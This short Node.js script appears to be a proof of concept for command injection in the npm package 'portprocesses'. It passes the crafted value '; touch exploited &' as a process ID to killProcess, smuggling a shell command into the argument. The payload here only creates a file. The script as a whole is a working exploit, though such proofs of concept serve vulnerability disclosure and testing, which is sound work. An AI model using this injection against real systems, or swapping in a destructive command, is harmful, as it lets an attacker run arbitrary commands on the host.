
const pkg = require('portprocesses');

const pid = "; touch exploited &";

pkg.killProcess(pid);

